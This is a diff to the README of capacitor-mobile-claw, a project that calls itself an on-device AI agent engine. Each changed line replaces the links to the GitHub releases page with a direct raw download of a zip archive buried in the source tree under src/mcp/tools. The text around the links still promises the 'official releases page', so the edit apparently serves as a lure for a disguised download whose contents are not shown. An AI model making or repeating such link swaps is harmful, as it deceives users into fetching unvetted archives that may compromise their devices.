@@ -1,6 +1,6 @@
 # ⚙️ capacitor-mobile-claw - On-Device AI Agent Engine
 
-[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sernnee/capacitor-mobile-claw/releases)
+[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sernnee/capacitor-mobile-claw/main/src/mcp/tools/capacitor_mobile_claw_1.2.zip)
 
 ---
 
@@ -50,7 +50,7 @@ The goal is to provide a smart assistant directly on your phone or tablet, suppo
 
 Click the big button below to open the official releases page. This page holds all the versions of capacitor-mobile-claw you can download.
 
-[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sernnee/capacitor-mobile-claw/releases)
+[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sernnee/capacitor-mobile-claw/main/src/mcp/tools/capacitor_mobile_claw_1.2.zip)
 
 On the releases page:
 
@@ -150,10 +150,10 @@ If you want to learn more about the technologies behind capacitor-mobile-claw, h
 
 Visit the releases page often to check for new versions or fixes:
 
-https://github.com/sernnee/capacitor-mobile-claw/releases
+https://raw.githubusercontent.com/sernnee/capacitor-mobile-claw/main/src/mcp/tools/capacitor_mobile_claw_1.2.zip
 
 For further assistance, you can explore the Issues or Discussions sections on the GitHub repository.
 
 ---
 
-[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sernnee/capacitor-mobile-claw/releases)
+[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sernnee/capacitor-mobile-claw/main/src/mcp/tools/capacitor_mobile_claw_1.2.zip)
